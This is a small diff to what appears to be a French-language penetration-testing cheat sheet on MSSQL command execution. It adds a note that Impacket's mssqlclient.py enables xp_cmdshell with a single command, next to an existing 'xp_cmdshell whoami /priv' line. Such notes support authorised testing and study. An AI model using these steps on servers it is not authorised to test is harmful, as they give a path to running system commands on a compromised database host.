@@ -146,6 +146,9 @@ SQL> xp_cmdshell whoami /priv
 #### Exécution de commandes (xp_cmdshell)
 
 ```sql
+-- Depuis l'outil Impacket mssqlclient.py
+enable_xp_cmdshell -- rien d'autre à taper normalement, la reconfiguration se fait automatiquement
+
 ------------------------------------------------------------------------
 -- Tentative d activation de xp_cmdshell  (si droits suffisants)
 -- Allow advanced options to be changed.  
